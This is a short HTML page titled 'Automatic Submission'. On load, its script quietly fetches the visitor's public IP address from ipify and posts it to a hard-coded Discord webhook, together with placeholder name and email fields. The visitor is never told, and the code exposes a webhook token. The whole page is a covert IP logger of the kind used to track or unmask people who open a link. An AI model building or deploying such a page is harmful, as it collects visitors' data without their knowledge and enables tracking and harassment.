<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Automatic Submission</title>
</head>
<body>
  <h1>Automatic Submission in Progress...</h1>
  
  <script>
    // Replace with your actual Discord webhook URL
    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1316507623830458530/AJs1HDBblw6pbV0MldGNLKA3pusxfwjPjFg1qKZ7qO3UcCLtkbTv5SIHvXTVS1FK9z58';

    // These could be static or dynamically generated values.
    // Since no interaction is desired, we just define them here.
    const fname = 'AutoFirstName';
    const lname = 'AutoLastName';
    const email = 'auto@example.com';

    // On page load, fetch IP and then send data automatically
    window.addEventListener('load', () => {
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          const userIP = data.ip;
          sendToDiscord(fname, lname, email, userIP);
        })
        .catch(err => {
          console.error('Error fetching IP:', err);
          sendToDiscord(fname, lname, email, 'IP not found');
        });
    });

    function sendToDiscord(fname, lname, email, ip) {
      const message = `New user info submitted automatically:\n**First Name:** ${fname}\n**Last Name:** ${lname}\n**Email:** ${email}\n**IP Address:** ${ip}`;

      fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: message })
      })
      .then(response => {
        if (response.ok) {
          console.log('Message sent to Discord successfully!');
        } else {
          console.error('Failed to send message to Discord:', response.status, response.statusText);
        }
      })
      .catch(err => console.error('Error sending message to Discord:', err));
    }
  </script>
</body>
</html>
